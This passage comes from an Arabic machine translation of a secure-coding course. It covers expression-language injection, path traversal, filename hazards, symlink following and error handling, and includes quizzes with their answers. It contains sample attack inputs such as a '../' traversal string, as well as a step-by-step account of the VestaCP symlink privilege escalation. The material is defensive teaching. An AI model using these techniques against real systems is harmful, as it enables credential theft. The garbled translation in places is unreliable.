من الواضح أنه من المهم التأكد من تقييم التعبيرات عدة مرات فقط كما هو متوقع (عادة مرة واحدة). من الحكمة التأكد من أن التكوين يقوم بذلك ، إذا كان هناك بديل ممكن. إذا كانت هناك أي مخاوف، فقم بتضمين الاختبارات في مجموعة الاختبار التلقائية للتحقق من أن التعبيرات يتم تقييمها مرة واحدة فقط في سياقات آمنة، بحيث يتم اكتشاف أي خطأ مستقبلي على الفور قبل استخدامه في الإنتاج. في حالة Spring ، يمكن للاختبار توفير بيانات كما  هو `${99999+1}` الحال في بنية محفوفة بالمخاطر ثم التأكد من أن نص الاستجابة هو النص المتوقع (وليس `100000`).

 2021 CWE Top 25 # 30 هو [CWE-917 ](https://cwe.mitre.org/data/definitions/917.html)، *التحييد غير الصحيح للعناصر الخاصة المستخدمة في بيان لغة التعبير ("حقن لغة التعبير").*


### أسماء الملفات (بما في ذلك اجتياز المسار والرابط التالي)

من الناحية الفنية ، "**اسم المسار**" هو سلسلة من البايتات التي تصف كيفية العثور على كائن نظام الملفات. في الأنظمة الشبيهة ب Unix ، بما في ذلك Linux و Android و MacOS و iOS ، يكون اسم المسار عبارة عن سلسلة من اسم ملف واحد أو أكثر مفصولة بواحد أو أكثر من "**/**". في أنظمة Windows ، يكون اسم المسار أكثر تعقيدا ولكن الفكرة هي نفسها. في الممارسة العملية ، يستخدم العديد من الأشخاص مصطلح "اسم الملف" للإشارة إلى أسماء المسارات.

غالبا ما يتم التحكم في أسماء المسارات جزئيا على الأقل بواسطة مستخدم غير موثوق به. على سبيل المثال ، غالبا ما يكون من المفيد استخدام أسماء الملفات كمفتاح لتحديد البيانات ذات الصلة ، ولكن هذا يمكن أن يؤدي إلى تحكم المستخدمين غير الموثوق بهم في أسماء الملفات. مثال آخر هو عند مراقبة أو إدارة الأنظمة المشتركة (على سبيل المثال ، الأجهزة الافتراضية أو أنظمة الملفات الموضوعة في حاويات) ؛ في هذه الحالة، يتحكم مراقب غير موثوق به في أسماء الملفات. حتى عندما لا يكون المهاجم قادرا على الحصول على هذا النوع من السيطرة ، غالبا ما يكون من المهم مواجهة هذا النوع من المشاكل كإجراء دفاعي في العمق ، لمواجهة المهاجمين الذين يكتسبون قدرا صغيرا من السيطرة.



#### مسار اجتياز

الحالة الواضحة هي أن الأنظمة لا يفترض في كثير من الأحيان أن تسمح بالوصول خارج بعض الأدلة (على سبيل المثال ، "جذر المستند" لخادم الويب). على سبيل المثال ، إذا حاول أحد البرامج الوصول إلى مسار عبارة عن سلسلة من "**trusted_root_path**" و "**اسم المستخدم**" ، فقد يتمكن المهاجم من إنشاء اسم مستخدم ". .**/.. /.. / أسراري**" وإحباط القيود. هذه الثغرة الأمنية ، حيث يمكن للمهاجم إنشاء أسماء ملفات تجتاز خارج المكان الذي من المفترض أن يكون فيه ، شائعة جدا لدرجة أن لها اسما: *ثغرات اجتياز الدليل*. كما هو الحال دائما ، استخدم قائمة مسموح بها محدودة للغاية للمعلومات التي سيتم استخدامها لإنشاء أسماء الملفات. إذا كانت القائمة المسموح بها لتطبيق الويب الخاص بك لا تتضمن "**.** "و" **/" و"**~**" و"**&#92;**** "، في معظم الأنظمة ، يكون من الصعب بشكل كبير اجتيازها خارج جذر الدليل المقصود. حل شائع آخر هو تحويل مسار نسبي إلى مسار مطلق طبيعي بطريقة تقضي على كل شيء ".**.** " ثم تأكد من أن المسار الناتج لا يزال في المنطقة الصحيحة من نظام الملفات.

>  وقت القصة: سالت ستاك

> مثال على  ثغرة اجتياز الدليل [هو CVE-2020-11652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11652) ، وهي ثغرة أمنية في SaltStack. SaltStack هي أداة لإدارة التكوين والتنسيق لإدارة البنية التحتية لأجهزة الكمبيوتر المتعددة. في هذه الثغرة الأمنية ، فشلت طريقة في تطهير معلمة الإدخال بشكل صحيح ، مما يسمح ".**.** " العناصر التي تم استخدامها لإنشاء اسم ملف. وكانت النتيجة أن المهاجمين يمكن أن يتسببوا في قيام مجموعات كاملة من الآلات بتنفيذ الأوامر التي يختارونها.

 يعد اجتياز المسار سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 8 و 2019 CWE Top 25 # 10. يتم تحديده أيضا على أنه [CWE-22 ](https://cwe.mitre.org/data/definitions/22.html)، *التقييد غير الصحيح لاسم المسار إلى دليل مقيد ("مسار ترافيرسال").*

#### أسماء مسارات ويندوز

قد يكون من الصعب للغاية التعامل مع أسماء مسارات Microsoft Windows بشكل آمن. تختلف تفسيرات اسم مسار Windows اعتمادا على إصدار Windows وواجهة برمجة التطبيقات المستخدمة (تستخدم العديد من المكالمات **CreateFile** الذي يدعم بادئة اسم المسار "**\\.&#92;** " - وهذه تفسر أسماء المسارات بشكل مختلف عن المكالمات الأخرى التي لا تفعل ذلك). ربما الأكثر وضوحا ، "**الرسالة:**" و "\**\ الخادم \ المشاركة ...** " لها معنى خاص في ويندوز. المشكلة الأكثر شرا هي أن هناك أسماء ملفات محجوزة ، يعتمد شكلها على واجهة برمجة التطبيقات المستخدمة والتكوين المحلي. أسماء الأجهزة المحجوزة المضمنة هي كما يلي: CON و PRN و AUX و NUL و COM1 و COM2 و COM3 و COM4 و COM5 و COM6 و COM7 و COM8 و COM9 و LPT1 و LPT2 و LPT3 و LPT4 و LPT5 و LPT6 و LPT7 و LPT8 و LPT9. والأسوأ من ذلك ، يمكن للسائقين إنشاء المزيد من الأسماء المحجوزة - لذلك لا يمكنك في الواقع معرفة الأسماء المحجوزة مسبقا. يجب تجنب إنشاء أسماء ملفات بأسماء محجوزة ، مع أو بدون امتداد ؛ إذا تمكن المهاجم من خداع البرنامج لقراءة / كتابة الاسم (على سبيل المثال ، **com1.txt) **، فقد يتسبب (اعتمادا على واجهة برمجة التطبيقات) في القراءة أو الكتابة على جهاز بدلا من ملف. في هذه الحالة ، حتى الأبجدية الرقمية البسيطة يمكن أن تسبب كارثة ويمكن تفسيرها على أنها أحرف وصفية - وهذا أمر نادر الحدوث ، لأن الأبجدية الرقمية عادة ما تكون آمنة. يدعم Windows** "/**" كفاصل دليل ، لكنه يستخدم تقليديا "**&# 92;** " كفاصل الدليل (وهو أمر مزعج لأن**&#92;**  يستخدم على نطاق واسع كشخصية هروب). في Windows، لا تنهي اسم ملف أو دليل بمسافة أو نقطة؛ قد يدعمه نظام الملفات الأساسي ، لكن غلاف Windows وواجهة المستخدم لا يدعمانه بشكل عام. لمزيد من التفاصيل، راجع وثائق Microsoft Windows حول [*تسمية الملفات والمسارات ومساحات الأسماء*](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN).

#### أسماء مسارات يونكس / لينكس

ليس من السهل دائما التعامل مع أسماء الملفات وأسماء المسارات على الأنظمة الشبيهة ب Unix. في معظم الأنظمة الشبيهة ب Unix ، يمكن أن يكون اسم الملف أي تسلسل من البايتات لا يتضمن **\0** (الفاصل) أو الشرطة المائلة. أحد المفاهيم الخاطئة الشائعة هو أن أسماء ملفات Unix عبارة عن سلسلة من الأحرف. أسماء ملفات Unix ليست سلسلة من حرف واحد أو أكثر; إنها مجرد سلسلة من البايتات ، لذلك لا يلزم أن يكون اسم الملف تسلسلا قانونيا للأحرف. على سبيل المثال ، في حين أنه من الشائع تفسير أسماء الملفات على أنها ترميز UTF-8 للأحرف ، فإن معظم الأنظمة لا تفرض ذلك بالفعل. في الواقع ، لا يميلون إلى فرض أي شيء ، لذلك يمكن إنشاء العديد من أسماء الملفات الإشكالية ، بما في ذلك أسماء الملفات ذات المسافات (أو المسافات فقط) ، أو أحرف التحكم (بما في ذلك السطر الجديد ، وعلامة التبويب ، والهروب ، وما إلى ذلك) ، أو البايتات غير القانونية UTF-8 ، أو

بما في ذلك "-" البادئة**** (علامة لخيارات الأوامر). يمكن أن تسبب أسماء الملفات الإشكالية هذه مشكلة لاحقا.

بعض المشاكل المحتملة مع أسماء الملفات خاصة ب shell ، لكن مشاكل اسم الملف لا تقتصر على shell. المشكلة الشائعة هي أن "**-**" هي علامة الخيار للعديد من الأوامر ، ولكنها بداية قانونية لاسم الملف.

الحل البسيط هو بادئة جميع الكرات الأرضية أو أسماء الملفات عند الحاجة ب "**./**" بحيث لا يمكن أن تبدأ ب "**-**". على سبيل المثال ، لا تستخدم أبدا "**&# 42;. pdf**" للإشارة إلى مجموعة من ملفات PDF إذا كان المهاجم قد يؤثر على أسماء ملفات الدليل؛ استخدم ".**/&#42;. بي دي إف**".

كن حذرا بشأن عرض أسماء المسارات أو تخزينها ، حيث يمكن أن تتضمن سطورا جديدة أو علامات تبويب أو هروبا (والتي يمكن أن تبدأ عناصر التحكم الطرفية) أو تسلسلات ليست سلاسل قانونية. في بعض الأنظمة ، يمكن أن يؤدي مجرد عرض أسماء الملفات إلى استدعاء عناصر التحكم الطرفية ، والتي يمكنها بعد ذلك تشغيل الأوامر بامتياز العرض الذي يتم عرضه.

#### معالجة الملفات (بما في ذلك الرابط التالي)

بمجرد أن يكون لديك اسم مسار ، غالبا ما تريد أن تفعل شيئا به ، مثل محاولة فتح هذا الملف.

كما تمت مناقشته في [ "احذر من ظروف السباق"](#beware-of-race-conditions) ، افتح الملفات بطرق تمنع ظروف سباق وقت التحقق من وقت الاستخدام (TOCTOU). افتح ملفا مباشرة بدلا من الاستعلام عما إذا كان الوصول مسموحا به (لأن ذلك قد يتغير). قم بتضمين الخيار "حصري" ("<tt>x</tt>" أو `O_EXCL`) إذا كنت تريد أن تطلب صراحة إنشاء الملف. إذا كنت تقوم بإنشاء ملفات مؤقتة، فاستخدم واجهات مصممة خصيصا لإنشاء ملفات مؤقتة بأمان.

إذا كان البرنامج قد يفتح كائن نظام ملفات (بما في ذلك دليل) قد يتحكم فيه مهاجم، فاستعد له. إحدى الطرق التي يمكن أن يحدث بها هذا والتي لم نناقشها بعد هي دقة الارتباط غير الصحيحة.

تدعم معظم أنظمة التشغيل "الروابط الصلبة" و "الروابط الرمزية" ... لكن العديد من المطورين لا يعرفون عنها أو لا يحسبونها. ينشئ "الارتباط الصلب" اسما آخر يشير إلى نفس كائن نظام الملفات الأساسي بالضبط ، بنفس الملكية والأذونات. "الرابط الرمزي" (المعروف أيضا باسم "الارتباط الرمزي" أو "الرابط الناعم") هو ملف خاص يحتوي على مرجع إلى ملف أو دليل آخر في شكل مسار مطلق أو نسبي. ستتم إعادة توجيه محاولة فتح الرابط الرمزي لفتح المرجع بدلا من ذلك. هذه يمكن أن تكون مفيدة جدا. ومع ذلك ، إذا تمكن أحد المهاجمين من إنشاء هذه الروابط في كائن نظام ملفات قد يفتحه تطبيقك ، فقد تكون هذه الروابط مشكلة أيضا ويجب أن تكون التطبيقات مستعدة للتعامل معها.

تحتاج إلى كتابة التعليمات البرمجية التي تم إعدادها للروابط الصلبة والرمزية. على وجه الخصوص ، لا تفترض أن جميع الملفات الموجودة في الدليل مملوكة بالضرورة لمالك الدليل. إذا كان برنامجك يحتوي على امتيازات مرتفعة، فقد تحتاج إلى إسقاط هذه الامتيازات مؤقتا قبل التعامل مع نظام الملفات. يمكنك أيضا فتح الملفات باستخدام `O_NOFOLLOW` الخيار على الأنظمة الشبيهة ب Unix ؛ يؤدي هذا إلى تعطيل الروابط الرمزية التالية على مكون اسم الملف الأخير (الاسم الأساسي) ، ولكن فقط على المكون الأخير ، وفي بعض لغات البرمجة يتطلب الأمر خطوات إضافية لاستخدام الخيار.

تدعم الإصدارات الحديثة من Windows الروابط الثابتة والروابط الرمزية. ومع ذلك ، يتطلب إنشاؤها عادة امتيازات مرتفعة (على سبيل المثال ، وضع المسؤول أو المطور) بحيث تكون أقل احتمالا إلى حد ما كطريقة هجوم مقارنة بالأنظمة الشبيهة ب Unix. لا تزال هذه الأنواع من الثغرات الأمنية تحدث على أنظمة Windows لأن المستخدمين المتميزين يمكنهم إنشاؤها وبعض التطبيقات غير مصممة لاستخدامها بشكل صحيح ، مما يؤدي إلى ثغرات أمنية قابلة للاستغلال.

هناك إجراءان شائعان يمكنك اتخاذهما على الأنظمة الشبيهة ب Unix لتقويتها ضد العديد من أنواع الهجمات المستندة إلى الروابط ، على الرغم من أنها لا تتصدى لجميع الهجمات:

1. يجب أن تحتوي جميع الدلائل القابلة للكتابة بواسطة عدة مستخدمين أيضا على مجموعة البتات "اللاصقة". في معظم الأنظمة الحديثة الشبيهة ب Unix ، يقيد الدليل الذي يحتوي على مجموعة البتات "الثابتة" التغييرات المسموح بها في الدليل. على سبيل المثال ، في أنظمة Linux ، يعني البت الثابت لأي ملف في هذا الدليل ، يمكن فقط لمالك الملف أو مالك الدليل أو المستخدم الجذر إعادة تسمية الملف أو حذفه. عادة على الأنظمة الشبيهة ب Unix ، يمكن أن يتم إدخال وإعادة تسمية الملفات في الدليل من قبل جميع المستخدمين الذين لديهم إذن كتابة على الدليل ، بغض النظر عن مالك الملف. عادة ما يتم تعيين البت الثابت بالفعل للأدلة المشتركة الموجودة مسبقا مثل `/tmp` ولكن يجب عليك تعيين البت الثابت بشكل خاص إذا قمت بإنشاء أدلة جديدة حيث تتم مشاركة الكتابة بين المستخدمين. يجعل البت اللاصق بعض أنواع الهجمات أكثر صعوبة في التنفيذ ، بما في ذلك تلك التي تعتمد على إنشاء أو تغيير الروابط في هذا الدليل.
2. حيثما كان ذلك متاحا ، قم بتمكين "الروابط الرمزية اللاصقة المحمية" (ويعرف أيضا باسم `protected_symlinks`). في الأنظمة ذات الروابط الرمزية اللاصقة المحمية ، يتم اتباع الارتباط الرمزي فقط إذا كان خارج دليل لزج قابل للكتابة في العالم ، أو عندما يتطابق معرف الارتباط الرمزي والتابع ، أو عندما يتطابق مالك الدليل مع مالك الارتباط الرمزي.  تقوم العديد من توزيعات Linux بتمكين هذا افتراضيا ، بما في ذلك Ubuntu و Fedora و Red Hat Enterprise Linux.

>  وقت القصة: رابط VestaCP بعد الثغرة الأمنية (CVE-2021-30463)

> VestaCP هي لوحة تحكم استضافة مفتوحة المصدر (تمكن مستخدمي خدمة الاستضافة من إدارة حزمة الاستضافة الخاصة بهم ، على سبيل المثال ، شراء أسماء النطاقات ، وتثبيت التطبيقات ، وإنشاء وإدارة حسابات البريد الإلكتروني ، وتحميل ملفات مواقع الويب).  لسوء الحظ ، يسمح VestaCP حتى الإصدار 0.9.8-24 للمهاجمين بالحصول على امتيازات من خلال إنشاء روابط رمزية للملفات التي يفتقرون إلى أذونات لها ، وهي ثغرة أمنية تم تحديدها على أنها [CVE-2021-30463](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-30463).

المشكلة الأساسية هي أن تطبيق VestaCP يفترض أن أي ملفات ضمن الدليل الرئيسي للمستخدم (بشكل مباشر أو غير مباشر) كانت بالضرورة مملوكة وخاضعة لسيطرة المستخدم. لكن هذا ليس صحيحا بالضرورة في أنظمة التشغيل الحديثة. في الغالبية العظمى من أنظمة التشغيل الحديثة ، تتيح الروابط الصلبة والرمزية الرجوع إلى الملفات الأخرى منها.

تم وصف تفاصيل هذا الهجوم على النحو التالي ([إفصاح SSD ، استشارة SSD - نقاط ضعف VestaCP LPE ، 20 مارس 2021](https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/)). يمكن للمهاجم الانتقال إلى دليل الويب الخاص بالمستخدم داخل الدليل الرئيسي وإنشاء دليل باسم المجال الذي يرغب في مهاجمته (على سبيل المثال ، *pwned.pwn*) الذي يتحكم فيه النظام. داخل هذا الدليل ، سيقوم المهاجم بإنشاء دليل آخر يسمى `public_xhtml`. وداخل `public_xhtml` المهاجم ،  سينشئ رابطا رمزيا (  على سبيل المثال ، pwn.pwn**) إلى الملف المطلوب الذي أراد المهاجم قراءته ، على سبيل المثال ، سر تسجيل الدخول في ملف user.conf لحساب المسؤول. أيضا في دليل المجال  ، *pwned.pwn* ، سيقوم المهاجم بإنشاء روابط رمزية للمجلدات التي ليس لدى المهاجم إذن للوصول إليها ، على سبيل المثال ، `/usr/local/vesta/data/users` و`/usr/local/vesta/data/users/admin`. يمكن للمهاجم بعد ذلك تشغيل الثغرة الأمنية عن طريق إنشاء مجال باسم *pwned.pwn* في عنوان URL / add / web الخاص ب VestaCP. يمكن للمهاجم الآن قراءة المحتويات السرية ل user.conf للمشرف ، مما يسمح للمهاجم بتغيير كلمة مرور المسؤول.


 2021 CWE Top 25 # 31 هو [CWE-59](https://cwe.mitre.org/data/definitions/59.html) ، دقة ارتباط غير صحيحة قبل الوصول إلى الملف ("الرابط التالي").

#### الاختبار 3.4: أسماء الملفات (بما في ذلك اجتياز المسار والرابط التالي)

\>\>حدد كافة العبارات الصحيحة.<<

[!] في نظامي التشغيل Unix و Linux ، أسماء الملفات عبارة عن سلسلة من الأحرف. {{ محدد: لا، بشكل عام أسماء الملفات في يونكس ولينكس هي سلسلة من البايتات، والتي قد يتم تعيينها أو لا يتم تعيينها إلى أي أحرف محددة على الإطلاق. تتطلب بعض التطبيقات وأنظمة الملفات المحددة أن تكون أسماء الملفات عبارة عن سلسلة من الأحرف ، ولكن هذا ليس صحيحا كبيان شامل. }}

[x] في نظامي التشغيل Unix وLinux، قد تحتوي أسماء الملفات على أحرف تحكم.

[x] في نظامي التشغيل Unix و Linux ، يمكن أن تكون أسماء الملفات ذات** الأحرف "-**" البادئة مشكلة أمنية. الحل البسيط هو بادئة globs ب "**./**" بحيث لا يمكن أن يكون الحرف الأول "**-**".

[x] يحدث اجتياز المسار عندما يتمكن المهاجم من إنشاء أسماء ملفات تجتاز خارج المكان الذي من المفترض أن يجتازه ، على سبيل المثال ، عن طريق تضمين "**/.. /**". هناك طريقة جيدة لمواجهة ذلك وهي استخدام قائمة مسموح بها محدودة تمنع هذه الهجمات.

## استدعاء برامج أخرى: قضايا أخرى

### استدعاء واجهات برمجة التطبيقات للبرامج والتحقق مما يتم إرجاعه

عند كتابة البرامج ، حاول استدعاء واجهات برمجة التطبيقات (APIs) المخصصة للاستخدام بواسطة البرامج فقط.

عادة ما يمكن للبرنامج استدعاء أي برنامج آخر ، بما في ذلك البرامج المصممة بالفعل للتفاعل البشري فقط. ومع ذلك ، فمن غير الحكمة عادة استدعاء برنامج مخصص للتفاعل البشري بنفس الطريقة التي يفعلها الإنسان. المشكلة هي أن الواجهات البشرية للبرامج غنية عن قصد بالوظائف وغالبا ما يصعب التحكم فيها بالكامل. على سبيل المثال ، غالبا ما تحتوي البرامج التفاعلية على رموز "هروب" ، والتي قد تمكن المهاجم من أداء وظائف غير مرغوب فيها. أيضا ، غالبا ما تحاول البرامج التفاعلية إدراك الإعدادات الافتراضية "الأكثر احتمالا" ؛ قد لا يكون هذا هو الإعداد الافتراضي الذي كنت تتوقعه ، وقد يجد المهاجم طريقة لاستغلال ذلك.

عادة ما تكون هناك معلمات لمنحك وصولا أكثر أمانا إلى وظائف البرنامج ، أو واجهة برمجة تطبيقات أو تطبيق مختلف مخصص للاستخدام من قبل البرامج ؛ استخدم هؤلاء بدلا من ذلك.

هذا يذهب في الاتجاه الآخر أيضا. إذا كنت تقوم بتطوير تطبيق بواجهة مستخدم تفاعلية للبشر ، فتأكد من وجود طريقة للبرنامج للوصول مباشرة إلى هذه الوظيفة أيضا. سيجعل ذلك من الأسهل بكثير دمج تطبيقك في شيء أكبر.

بالطبع ، بمجرد تلقي المعلومات ، تأكد من التحقق من حالات الخطأ (إما مباشرة أو عن طريق رفع استثناء). إذا فشل طلب يحتوي على بيانات غير موثوق بها ، فلا ينبغي أن يستمر برنامجك بكل سرور كما لو نجح. تعد معالجة الأخطاء موضوعا مهما سنغطيه بعد ذلك.

#### اختبار 3.5: استدعاء واجهات برمجة التطبيقات للبرامج والتحقق مما يتم إرجاعه

\>\>من أحد البرامج ، حاول استخدام نفس واجهة برمجة التطبيقات التي يستخدمها البشر ، حيث قد يتم اختبارها بشكل أفضل. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. هذا من شأنه أن يجعل من الصعب كتابة التعليمات البرمجية (وتحديثها لاحقا). والأهم من ذلك ، أن الواجهات البشرية غالبا ما تتغير أو تقوم بتخمينات غير مناسبة عند محاولة أتمتة شيء ما.

[تفسير]

### معالجة الأخطاء

يجب أن تتعامل البرامج الحقيقية مع الأخطاء. العديد من برامج الإنتاج هي * في الغالب* معالجة الأخطاء ، لأن هناك الكثير من المشاكل التي يمكن أن تحدث في العالم الحقيقي.

يمكن أن يؤدي سوء معالجة الأخطاء إلى ثغرات أمنية. لذلك دعونا نناقش الأساليب الشائعة لمعالجة الأخطاء وكيفية استخدامها بشكل آمن. في الأساس ، يتضمن ذلك فهم نقاط القوة والضعف لديهم ، وتوخي الحذر بشأن نقاط ضعفهم عند استخدامها.

>  وقت القصة: أبل **غوتو تفشل. فشل الذهاب ؛**

> مثال على ثغرة أمنية ناتجة عن معالجة الأخطاء السيئة هي [CVE-2014-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266) ، والتي تسمى عادة "*فشل goto; غوتو تفشل.* " الضعف. كانت هذه ثغرة أمنية في تنفيذ Apple لبروتوكول SSL / TLS في العديد من إصدارات أنظمة التشغيل الخاصة بها. كانت المشكلة ثانية (مكررة) "**goto fail;** " في الدالة **SSLVerifySignedServerKeyExchange **، على النحو التالي:

~~~~C
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
      goto fail;
    goto fail;
    ... other checks ...
    fail:
      ... buffer frees (cleanups) ...
      return err;
~~~~

> المسافة البادئة هنا مضللة ؛ نظرا لعدم وجود أقواس مجعدة بعد  عبارة **if ، يتم دائما تنفيذ "**goto fail**" الثاني**. في السياق ، كان هذا يعني أنه تم تخطي رمز التحقق من التوقيع الحيوي ، لذلك سيتم قبول كل من التوقيعات السيئة والجيدة. تسبب "**goto**" الدخيل في إرجاع الوظيفة 0 ("لا يوجد خطأ") عند تخطي بقية الفحص ؛ ونتيجة لذلك، تم قبول الشهادات غير الصالحة بهدوء على أنها صالحة. كانت هذه ثغرة كارثية ، لأنها تعني أنه سيتم قبول جميع أنواع الشهادات غير الصالحة ، مما يعرض الأمن للخطر تماما. سيتم اكتشاف هذه الثغرة الأمنية بسهولة بواسطة مجموعة اختبار آلية. ([*ثغرة فشل Apple goto: الدروس المستفادة ، *](https://dwheeler.com/essays/apple-goto-fail.html)بقلم ديفيد أ. ويلر ، 2020).

#### رموز الإرجاع

واحدة من أكثر آليات معالجة الأخطاء شيوعا هي رموز الإرجاع. رمز الإرجاع هو ببساطة قيمة واحدة إما ** قيمة  الإرجاع لطريقة / وظيفة / إجراء أو قيمة تشير إلى وجود خطأ. على سبيل المثال ، "عند إرجاع النجاح 0..INT_MAX ، أو عند إرجاع الخطأ -1" أو "عند إرجاع مؤشر ، أو عند إرجاع الخطأ NULL". في بعض الحالات ، لا يتم إرجاع أي شيء (على الأقل كقيمة إرجاعه) ، وبالتالي فإن القيمة المرجعة هي ببساطة ما إذا كان هناك خطأ أم لا. رموز الإرجاع هي الطريقة المعتادة في C ، ولكن يتم استخدام رموز الإرجاع في العديد من لغات البرمجة.

من الواضح ، عند تطوير برنامج ، تحتاج إلى التأكد من أن رمز الإرجاع ليس قيمة مشروعة ، بحيث يمكن تمييز الأخطاء والقيم العادية ** .

تعمل رموز الإرجاع ، لكن لديها العديد من المشكلات عند صيانة البرنامج بمرور الوقت:

* يطلبون من المتصل التحقق من كل قيمة إرجاع بحثا عن خطأ لمعالجتها. من السهل نسيانها ، وبالتالي هذا خطأ شائع.

* قد يكون لكل طريقة دلالات مختلفة (على سبيل المثال ، قيم مختلفة للإشارة إلى "خطأ"). غالبا ما تكون **0** ** أو سالبة **أو **INT_MAX أو **NULL** أو **بعض القيم الخاصة الأخرى ... لكن ليس دائما.

* إذا تمت إضافة أنواع جديدة من الأخطاء ، فيجب عليك غالبا التحقق من كل متصل للتأكد من معالجتها بشكل صحيح.

* أنها تؤدي إلى المنطق الوظيفي ومعالجة الأخطاء يجري مختلطة معا. غالبا ما يؤدي هذا إلى إنشاء كود أكثر تعقيدا ، مما يؤدي إلى أخطاء وإنتاجية أقل. على وجه الخصوص ، غالبا ما تفشل هذه التعليمات البرمجية في إلغاء تخصيص الموارد إذا كان يجب عليها القيام بذلك.

في معظم لغات البرمجة ، غالبا ما يكون من الأفضل استخدام آلية أخرى (مثل معالجة الاستثناءات) بدلا من ذلك عند إنشاء الواجهة ، لأن رموز الإرجاع تؤدي بسهولة إلى أخطاء بمرور الوقت. هذا ليس عمليا في C المحمولة ، لأن C ليس لديها العديد من الآليات الأخرى (على سبيل المثال ، C ليس لديها آلية معالجة استثناء قياسية). لذلك ، إذا كنت تستخدم C ، ففكر في نقل معالجة الأخطاء إلى نهاية الوظيفة. هذا يفصل معالجة الأخطاء عن المنطق الوظيفي ويبسط موقع صفقة المورد الصحيح. يوجد شرح جيد لهذا النهج في [دليل أسلوب ترميز Linux kernel](https://www.kernel.org/doc/Documentation/process/coding-style.rst).

عندما تستخدم واجهة تستخدم رموز الإرجاع ، تأكد من التحقق في كل مرة يوجد فيها رمز إرجاع إذا كان الفشل قد يؤدي إلى ثغرة أمنية. على سبيل المثال ، تم العثور على حوالي 35 مليار جهاز إنترنت الأشياء (IoT) في عام 2021 بها ثغرات أمنية كارثية بسبب عدم كفاية توليد الأرقام العشوائية المشفرة. ويرجع ذلك جزئيا إلى أن العديد من مطوري برامج إنترنت الأشياء اتصلوا مباشرة بمولدات الأرقام العشوائية للأجهزة (لا ينبغي لهم فعل ذلك) ، ولكن الأسوأ من ذلك ، أنهم تجاهلوا رموز إرجاع الأخطاء من تلك المولدات (وبالتأكيد لا ينبغي عليهم فعل ذلك). لمزيد من التفاصيل حول هذا المثال، راجع [أنت تقوم بعمل IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([عرض](https://www.youtube.com/watch?v=Zuqw0-jZh9Y) تقديمي) بقلم دان بترو وألان سيسيل، عرض تقديمي ل DEF CON لعام 2021. سنناقش إنشاء أرقام عشوائية مشفرة بمزيد من التفصيل لاحقا.

#### الاستثناءات

تحتوي معظم لغات البرمجة على *آلية معالجة* استثناءات  (على الرغم من وجود استثناءات!). يتضمن ذلك لغات متنوعة مثل Java و C # و Python و PHP (5+) و Perl و Ruby و TCL و JavaScript و C ++ و Ada و Smalltalk و Common Lisp و Scheme (6+) و Erlang و OCaml. في مثل هذه الأنظمة ، يمكنك "رمي" أو "رفع" استثناء عند اكتشاف خطأ ، ويمكنك "التقاط" أو "إنقاذ" استثناء للتعامل معه ؛ يتم فك المكدس بشكل متكرر عند طرح استثناء حتى يكون هناك صيد مطابق. تحدد العديد من اللغات المناطق التي يجب التقاطها (على سبيل المثال ، "حاول").

إذا كنت تقوم بتنفيذ  المستوى *الأعلى* من برنامج أو إطار عمل (على سبيل المثال ، حلقة الحدث الرئيسية الخاصة به) ، فأنت تريد عادة التقاط جميع الاستثناءات (ربما مع استثناءات قليلة ، إيه). سجل الاستثناء (مع بعض التفاصيل ، باستثناء معلومات مثل كلمات المرور التي ربما يجب حذفها من السجل). تأكد من أنه بعد اكتمال الطلب أو الحدث، بما في ذلك عند معالجة استثناء، تم إرجاع جميع الموارد إذا كان ينبغي إرجاعها. أخيرا ، كرر حلقة الحدث لمعالجة الحدث التالي. يمكن أن يساعد التسجيل في تصحيح الأخطاء واكتشاف التسلل. لا بأس من إخبار مقدم الطلب أنه "كانت هناك مشكلة" مع عدم تقديم الكثير من التفاصيل ؛ هذا هو الغرض من السجل الداخلي.

بخلاف ذلك ، يجب أن تكون محددا بشكل عام بشأن الاستثناءات التي تلتقطها ، ولا تلتقط استثناء إلا إذا كان بإمكانك فعل شيء مناسب حيال ذلك. سيحاول المهاجمون تشغيل الاستثناءات، لذا تأكد من أن معالجات الاستثناءات آمنة.

#### طرق أخرى لمعالجة الأخطاء

هناك طرق أخرى لمعالجة الأخطاء.

تستخدم بعض لغات البرمجة منشئات النوع التي توفر قيمة إرجاع تميز القيم العادية عن قيم الخطأ. وخير مثال على ذلك هو هاسكل  ربما **، والذي يعرف بأنه "****البيانات ربما = لا شيء | فقط**". هذا يعني أن  قيمة **ربما** يجب أن تكون إما **لا شيء** أو **مجرد** قيمة. يشبه هذا الأسلوب إرجاع الخطأ ، ولكن نظرا لأن نظام النوع يميز القيمة عن الأخطاء (غير القيم) ، فلا يمكنك تجاهل الأخطاء عن طريق الخطأ ؛ يجب عليك استخراج القيمة للحصول على نتيجة. توفر بعض لغات البرمجة أيضا بنيات للقيام بهذا الاستخراج بسهولة ونشر الخطأ بطريقة أخرى ، على سبيل المثال ، [عامل التشغيل "؟" في Rust](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html) والتسلسل [الاختياري في Swift](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html). بالطبع ، يمكنك كتابة التعليمات البرمجية عن قصد لتخطي قيمة الخطأ (على سبيل المثال ، **لا شيء**) ؛ احذر من القيام بذلك إذا كان هذا قد يكون له تأثير أمني.

تسمح بعض اللغات بإرجاع متعدد القيم واستخدامها لمعالجة الأخطاء. على سبيل المثال ، تقوم اصطلاحات خطأ Go بذلك. يمكن أن ترجع الدالات قيما متعددة ، ويمكن أن تكون إحداها قيمة خطأ. هذا يتجنب مخاطر التحميل الزائد للقيم مقارنة بقيم الإرجاع التقليدية. ومع ذلك ، مثل قيم الإرجاع ، هناك خطر أن تنسى التحقق من قيمة إرجاع الخطأ المنفصلة. لمزيد من التفاصيل ، راجع [*The Go Blog: معالجة الأخطاء و Go*](https://blog.golang.org/error-handling-and-go) (2011) ، بقلم أندرو جيران.

#### اختتام معالجة الأخطاء

